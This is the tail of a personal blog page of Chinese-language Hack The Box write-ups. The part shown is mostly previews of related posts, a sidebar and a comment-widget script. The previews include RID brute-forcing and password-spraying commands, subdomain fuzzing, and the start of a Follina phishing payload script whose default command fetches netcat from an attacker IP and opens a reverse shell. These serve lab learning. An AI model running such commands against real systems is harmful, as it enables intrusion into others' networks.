id=&#x27;search4users&#x27;    xml:lang=&#x27;en&#x27;&gt;	&lt;query xmlns=&#x27;jabber:iq:search&#x27;&gt;       ...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Manager/" title="HTB-M-Manager"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Manager</div></div><div class="info-2"><div class="info-item-1">HTB-M-Manager RID攻击 ADCS提权  扫扫先扫一波，有web服务就去看看 测试一下功能点 貌似没xss 扫扫ldap端口,没有连接不让扫  扫扫smb  这种需要身份验证，但是假用户也能得到部分验证 可以尝试 RID 循环攻击1impacket-lookupsid dll@manager.htb -no-pass  输出中 : 前的数字是 RID 直接提取用户 1| grep SidTypeUser | cut -d&#x27; &#x27; -f2 | cut -d&#x27;\&#x27; -f2 | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27; | tee users  可以以使用netexec1netexec smb 10.10.11.236 -u guest -p &#x27;&#x27; --rid-brute  之后测试一下那个有没有用户名账号密码一样的 1netexec smb manager.htb -u users -p users --continue-on-success...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Outdated/" title="HTB-M-Outdated"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Outdated</div></div><div class="info-2"><div class="info-item-1">HTB-M-Outdated讲的是一个CVE的钓鱼，还有一个WSUS的提权+AddKeyCredentialLink的横移  扫端口， smb匿名登录存在文件泄露pdf文件中存在在邮箱账户，以及几个CVE需要修补的 然后利用 存在RID但是我没有进行后续的信息收集，钓鱼攻击CVE-2022-30190编写脚本12345678910111213141516171819202122#!/usr/bin/env python3import base64import randomimport stringimport sysif len(sys.argv) &gt; 1:    command = sys.argv[1]else:    command = &quot;IWR http://10.10.16.14/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.16.14 443 -e cmd&quot;base64_payload =...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Pov/" title="HTB-M-Pov"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Pov</div></div><div class="info-2"><div class="info-item-1">HTB-M-Pov讲的是  根据 web.config 中的文件泄露，构造发送这恶意 viewstate，来执行命令 一个账号密码文件泄露 SeDebugPirvilege的提权（就是有进程迁移进入系统权限  子域名爆破1ffuf -u http://10.10.11.251 -H &#x27;HOST: FUZZ.pov.htb&#x27; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -ac   爆破文件 1./gobuster -t 15 --delay 100ms dir -e -u &quot;http://dev.pov.htb/portfolio&quot; -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-SolarLab/" title="HTB-M-SolarLab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-SolarLab</div></div><div class="info-2"><div class="info-item-1">HTB-M-SolarLab 账户名的模糊猜测 PeportLab的CVE复现 Openfire脚本中提取账号密码  扫一扫  试探smb 可以用来打RID  1netexec smb 10.10.11.16 -u guest -p &#x27;&#x27; --rid-brute  然后就是  下载xlsx文件  1netexec smb solarlab.htb -u u.txt -p...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-bigbang"><span class="toc-number">1.</span> <span class="toc-text">HTB-bigbang</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%981"><span class="toc-number">1.1.1.</span> <span class="toc-text">解决问题1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%982"><span class="toc-number">1.1.2.</span> <span class="toc-text">解决问题2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E8%AF%BB%E5%8F%96%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">先读取版本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0docker%E5%86%85%E9%83%A8%E7%9A%84shell"><span class="toc-number">1.1.3.</span> <span class="toc-text">拿到docker内部的shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AE%B5"><span class="toc-number">1.2.</span> <span class="toc-text">二段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AAflag"><span class="toc-number">1.3.</span> <span class="toc-text">第一个flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3000%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">3000端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.3.2.</span> <span class="toc-text">破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%B4%A6%E6%88%B7"><span class="toc-number">1.3.3.</span> <span class="toc-text">获得第二个账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9000%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.4.</span> <span class="toc-text">9000端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AAflag"><span class="toc-number">1.4.</span> <span class="toc-text">第二个flag</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-SolarLab/" title="HTB-M-SolarLab">HTB-M-SolarLab</a><time datetime="2025-05-23T12:58:09.000Z" title="Created 2025-05-23 20:58:09">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Pov/" title="HTB-M-Pov">HTB-M-Pov</a><time datetime="2025-05-23T12:57:57.000Z" title="Created 2025-05-23 20:57:57">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Outdated/" title="HTB-M-Outdated">HTB-M-Outdated</a><time datetime="2025-05-23T12:55:16.000Z" title="Created 2025-05-23 20:55:16">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Manager/" title="HTB-M-Manager">HTB-M-Manager</a><time datetime="2025-05-23T12:55:03.000Z" title="Created 2025-05-23 20:55:03">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Jab/" title="HTB-M-Jab">HTB-M-Jab</a><time datetime="2025-05-23T12:54:38.000Z" title="Created 2025-05-23 20:54:38">2025-05-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
